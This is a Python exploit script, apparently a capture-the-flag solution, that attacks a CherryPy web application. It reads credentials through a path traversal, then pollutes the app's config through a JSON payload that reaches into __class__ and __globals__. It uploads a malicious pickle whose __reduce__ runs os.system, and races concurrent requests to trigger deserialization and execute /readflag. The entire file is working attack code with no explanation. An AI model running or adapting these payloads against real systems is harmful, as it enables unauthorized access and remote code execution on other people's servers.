import requests
import pickle
import asyncio
import aiohttp
import threading
import os

URL = os.environ.get("URL", "http://localhost:1337")
if URL.endswith("/"):
    URL = URL[:-1]

s = requests.Session()


class FileSession:
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        import os

        return (os.system, (self.cmd,))


async def trigger(session: aiohttp.ClientSession, i: int) -> dict:
    try:
        async with session.get(
            f"{URL}/api/config",
            cookies={"session_id": "6"},
            timeout=aiohttp.ClientTimeout(total=30),
        ) as resp:
            resp.raise_for_status()
            return await resp.text()
    except Exception as _:
        return {}


async def main():
    async with aiohttp.ClientSession() as session: # race!
        tasks = [trigger(session, i) for i in range(6, 30)]
        await asyncio.gather(*tasks, return_exceptions=False)


def fd():
    s.post(
        f"{URL}/api/login",
        files={
            "file": (
                "file",
                pickle.dumps(FileSession("/readflag > /app/static/flag"), protocol=2),
                "application/json",
            )
        },
    )


def check_flag():
    r = s.get(f"{URL}/static/flag")
    if r.status_code == 200 and "ptm" in r.text:
        print(r.text)
        return True
    return False


# get creds
user, psw = requests.get(f"{URL}/static/..%2fstatic_but_private/creds.txt").text.split(':')

# login
r = s.post(
        f"{URL}/api/login", json={"username": user.strip(), "password": psw.strip()}
    )

assert r.status_code == 200, "Invalid credentials"

# pollute config
s.post(
    f"{URL}/api/config",
    json={
        "__class__": {
            "__init__": {
                "__globals__": {
                    "cherrypy": {
                        "request": {
                            "app": {
                                "config": {
                                    "/": {
                                        "tools.sessions.storage_path": "/proc/1/fd/",
                                        "tools.sessions.SESSION_PREFIX": "",
                                        "tools.sessions.locking": "none",
                                        "tools.sessions.locked": "true",
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    },
    cookies=s.cookies,
)

while not check_flag():
    # upload payload
    threading.Thread(target=fd).start()
    # trigger deserialization
    asyncio.run(main())
